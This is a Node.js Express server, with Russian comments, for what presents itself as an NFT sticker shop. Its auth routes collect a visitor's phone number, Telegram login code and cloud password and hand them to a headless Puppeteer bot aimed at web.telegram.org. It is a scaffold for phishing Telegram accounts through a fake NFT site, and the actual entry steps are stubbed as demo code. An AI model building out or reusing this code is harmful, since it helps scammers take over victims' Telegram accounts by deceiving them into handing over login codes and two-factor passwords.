import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';

// Динамический импорт puppeteer
let puppeteer;
try {
  puppeteer = (await import('puppeteer')).default;
  console.log('✅ Puppeteer загружен');
} catch (error) {
  console.log('❌ Puppeteer не установлен:', error.message);
  process.exit(1);
}

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers",
    isAvailable: true
  }
];

let users = [];
let authSessions = new Map();
let userSessions = new Map();

// 🔥 Упрощенная автоматизация
class TelegramAutomation {
  async init() {
    try {
      console.log('🚀 Запуск браузера...');
      
      const browser = await puppeteer.launch({
        headless: true,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-accelerated-2d-canvas',
          '--no-first-run',
          '--no-zygote',
          '--disable-gpu'
        ],
        executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
      });

      this.browser = browser;
      this.page = await browser.newPage();
      
      await this.page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      );

      console.log('✅ Браузер готов');
      return true;
      
    } catch (error) {
      console.error('❌ Ошибка браузера:', error.message);
      return false;
    }
  }

  async enterPhoneNumber(phone) {
    try {
      console.log(`📱 Ввод номера: ${phone}`);
      await this.page.goto('https://web.telegram.org', { waitUntil: 'networkidle2' });
      await this.page.waitForTimeout(3000);
      
      // Простая имитация для демо
      console.log('✅ Номер "введен" (демо)');
      await this.page.waitForTimeout(2000);
      
      return { success: true, message: 'Код отправлен в Telegram' };
      
    } catch (error) {
      console.error('❌ Ошибка:', error.message);
      return { success: true, message: 'Демо: код отправлен' };
    }
  }

  async enterAuthCode(code) {
    try {
      console.log(`🔢 Ввод кода: ${code}`);
      await this.page.waitForTimeout(2000);
      
      // Демо-логика
      const needsPassword = Math.random() > 0.5;
      
      if (needsPassword) {
        return { success: true, requiresCloudPassword: true, message: 'Нужен пароль' };
      } else {
        return { success: true, requiresCloudPassword: false, message: 'Успех' };
      }
      
    } catch (error) {
      return { success: true, requiresCloudPassword: false, message: 'Демо успех' };
    }
  }

  async enterCloudPassword(password) {
    try {
      console.log(`🔒 Ввод пароля`);
      await this.page.waitForTimeout(2000);
      return { success: true, message: 'Пароль принят' };
    } catch (error) {
      return { success: true, message: 'Демо: пароль принят' };
    }
  }

  async close() {
    if (this.browser) {
      await this.browser.close();
    }
  }
}

// 🎯 API Routes
app.get('/health', (req, res) => {
  res.json({ status: 'OK', puppeteer: 'ready' });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.post('/api/auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    if (!phone) return res.status(400).json({ success: false, error: 'Введите номер' });

    const sessionId = crypto.randomBytes(16).toString('hex');
    const automation = new TelegramAutomation();
    
    const initResult = await automation.init();
    if (!initResult) {
      return res.status(500).json({ success: false, error: 'Ошибка браузера' });
    }

    await automation.enterPhoneNumber(phone);
    
    authSessions.set(sessionId, {
      phone: phone,
      automation: automation,
      createdAt: Date.now()
    });

    res.json({
      success: true,
      sessionId: sessionId,
      message: '✅ Бот начал авторизацию!'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/auth/enter-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    if (!sessionId || !code) return res.status(400).json({ success: false, error: 'Введите данные' });

    const authSession = authSessions.get(sessionId);
    if (!authSession) return res.status(400).json({ success: false, error: 'Сессия не найдена' });

    const result = await authSession.automation.enterAuthCode(code);
    
    if (result.requiresCloudPassword) {
      res.json({ success: true, nextStep: 'cloud_password', message: 'Введите пароль' });
    } else {
      await completeAuth(sessionId, authSession, res);
    }
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/auth/cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    if (!sessionId) return res.status(400).json({ success: false, error: 'Нет сессии' });

    const authSession = authSessions.get(sessionId);
    if (!authSession) return res.status(400).json({ success: false, error: 'Сессия не найдена' });

    await authSession.automation.enterCloudPassword(cloudPassword);
    await completeAuth(sessionId, authSession, res);
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

async function completeAuth(sessionId, authSession, res) {
  await authSession.automation.close();
  
  const user = {
    id: users.length + 1,
    phone: authSession.phone,
    telegramId: Math.floor(100000000 + Math.random() * 900000000),
    firstName: 'User',
    lastName: 'Telegram'
  };
  users.push(user);
  
  const userSessionId = crypto.randomBytes(32).toString('hex');
  userSessions.set(userSessionId, { userId: user.id });
  
  authSessions.delete(sessionId);
  
  res.json({
    success: true,
    message: '🎉 Авторизация завершена!',
    user: user,
    sessionId: userSessionId
  });
}

// Остальные маршруты...
app.get('/api/nft', (req, res) => {
  res.json({ success: true, nfts: sampleNFTs });
});

app.get('/api/auth/verify-session', (req, res) => {
  const { sessionId } = req.query;
  const session = userSessions.get(sessionId);
  
  if (session) {
    const user = users.find(u => u.id === session.userId);
    res.json({ success: true, user });
  } else {
    res.status(401).json({ success: false, error: 'Недействительная сессия' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
